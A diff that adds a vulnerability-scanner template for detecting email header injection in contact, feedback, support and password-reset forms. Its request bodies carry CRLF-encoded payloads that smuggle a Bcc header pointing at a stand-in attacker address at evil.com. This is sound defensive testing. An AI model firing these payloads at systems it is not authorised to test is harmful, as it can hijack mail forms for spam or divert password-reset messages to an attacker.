@@ -1,0 +1,64 @@
+id: whai-email-header-injection
+
+info:
+  name: Email Header Injection
+  author: whitehat-ai
+  severity: high
+  description: Detects email header injection in contact forms and password reset
+  tags: email,injection,header,spam
+  reference:
+    - https://owasp.org/www-community/attacks/Email_Header_Injection
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/contact"
+      - "{{BaseURL}}/api/contact"
+      - "{{BaseURL}}/feedback"
+      - "{{BaseURL}}/api/feedback"
+      - "{{BaseURL}}/support"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: "name=test%0d%0aBcc:whaitest@evil.com&email=test@test.com&message=test"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 302
+
+      - type: word
+        negative: true
+        part: body
+        words:
+          - "invalid"
+          - "error"
+          - "blocked"
+          - "rejected"
+        condition: and
+
+  - method: POST
+    path:
+      - "{{BaseURL}}/forgot-password"
+      - "{{BaseURL}}/api/forgot-password"
+      - "{{BaseURL}}/password/reset"
+      - "{{BaseURL}}/api/password/reset"
+    headers:
+      Content-Type: "application/x-www-form-urlencoded"
+    body: "email=test@test.com%0d%0aBcc:whaitest@evil.com"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 302
+
+      - type: word
+        negative: true
+        part: body
+        words:
+          - "invalid email"
+          - "not found"
+        condition: and
